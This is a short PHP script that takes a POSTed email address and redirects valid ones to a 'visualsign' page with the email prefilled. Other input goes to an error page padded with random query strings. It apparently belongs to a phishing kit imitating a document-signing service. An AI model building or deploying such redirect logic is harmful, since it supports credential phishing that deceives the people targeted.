<?php
error_reporting(0);

function RndString($length = 50) {
	return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}

$rand1 = RndString(50);
$rand2 = RndString(50).''.RndString(50);
$rand3 = RndString(50).''.RndString(50).''.RndString(50);

$id = $_POST['id'];

if (filter_var($id, FILTER_VALIDATE_EMAIL)) {
    header("Location: visualsign/?sub=".$id);
} elseif (!filter_var($id, FILTER_VALIDATE_EMAIL)) {
	header("Location: error.php?$rand2.$rand1=$rand1&$rand3");
}

?>